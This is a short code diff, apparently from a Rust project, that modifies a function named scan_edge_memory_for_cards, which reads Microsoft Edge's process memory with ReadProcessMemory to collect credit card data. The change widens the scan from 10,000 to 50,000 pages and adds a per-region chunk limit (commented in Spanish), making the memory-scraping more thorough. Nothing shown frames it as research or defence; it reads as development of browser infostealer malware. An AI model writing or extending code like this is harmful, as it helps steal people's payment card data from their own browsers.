@@ -156,7 +156,9 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
                         region_start, region_end, mbi.RegionSize / 1024));
                 }
                 
-                while region_addr < region_end && pages_scanned < 10000 {
+                // Escanear esta región en chunks (máximo 256 páginas por región)
+                let mut pages_in_region = 0;
+                while region_addr < region_end && pages_scanned < 50000 && pages_in_region < 256 {
                     let mut bytes_read: usize = 0;
                     
                     // ReadProcessMemory
@@ -169,6 +171,7 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
                     );
                     
                     pages_scanned += 1;
+                    pages_in_region += 1;
                     
                     if result != 0 && bytes_read > 0 {
                         pages_readable += 1;
